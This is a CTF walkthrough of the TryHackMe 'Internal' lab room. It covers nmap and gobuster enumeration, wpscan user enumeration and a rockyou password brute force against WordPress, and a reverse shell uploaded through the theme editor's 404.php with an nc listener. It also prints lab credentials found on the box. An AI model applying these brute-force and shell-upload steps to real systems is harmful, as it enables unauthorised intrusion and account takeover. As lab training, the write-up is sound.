## Internal
---
THM Internal Room Walkthrough: https://tryhackme.com/room/internal



## Summary
---



## Difficulties/Lessons Learned
---



## Walkthrough
---
Start by visiting the web page as well as nmapping, and directory enumeration.

```bash
nmap -sS -sV -sC -Pn 10.10.122.76 

gobuster -u http://10.10.122.76 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt dir
```

We get the following ports and directories:

```bash
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.122.76
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://10.10.122.76/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.122.76/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.122.76/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.122.76/phpmyadmin/]
```

Checking out the directories gives us some interesting info. /phpmyadmin gets us to a login page we may be able to exploit and the /wordpress directory gets us to a page with a log in button that does not work. However, on the wordpress page we can see Archives. The archive is also broken but it leads us to an interesting URL: 

```bash
http://internal.thm/blog/index.php/2020/08/
```

Maybe if we iterate through various months, we can discover something. Also, replacing internal.thm with out IP actual resolves to a website and also gives us the Wordpress log in site! Although the pages now resolve, it is still quite broken so let's focus on something else first. 

SSHing with anonymous or admin/admin does not seem to work. Let's try enuming the ports again but scanning all of them.

This does not give us more ports.

Let's try admin/admin on the php admin site. Interesting! Although the password does not work, we get this error: 

![](attachments/Pasted%20image%2020250207132551.png)

## Change of approach

At this point, nothing was working and the only thing that made sense was to go back to the internal.thm. Anytime I would replace this with the IP address, it would work. This and some further research made me realize we can just change the /etc/hosts file to account for this. 

```bash
vim /etc/hosts

# In the hosts file add the following entry (don't put the arrow) internal.thm --> <TARGET_IP>
```

Now when visiting all the links everything works. Just from looking around the site we definitely have a user named admin, since this user was seen making a post. After more research on the best way to enumerate and explpoit a WP site, I found out about wpscan to enumerate the accounts and even try to brute force login.

Using the following commands:

```bash
wpscan --url http://internal.thm/blog -e u

wpscan --url http://internal.thm/blog -U admin --passwords /usr/share/wordlists/rockyou.txt
```

We get the username admin (which we already knew) and we get the password "my2boys". Let's try loggin in on Wordpress. Log in is successful.

When navigating around wordpress we can see a private/hidden post with the following info

![](attachments/Pasted%20image%2020250207154159.png)

Let's try to login on myphp with this. Does not work. Let's try ssh. Also does not work. Let's save this info for now. 

Let's try upload a reverse shell into the theme editor under the 404.php file. Once added we set up an nc listener 

```bash
nc -nlvp 4444
```

and then access the page with the following directory /blog/wp-content/themes/twentyseventeen/404.php

We now have a reverse shell. Navigating to /home we see we have a user named aubreanna. We can't access her directory and i can't find the user.txt flag file anywhere else. After some more searching we see the wp-save.txt file in the /opt folder which tells use aubreanna's password. LEt's try sshing in with these credentials

```bash
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$ 
```

It works, and we find our first user flag

![](attachments/Pasted%20image%2020250207171907.png)

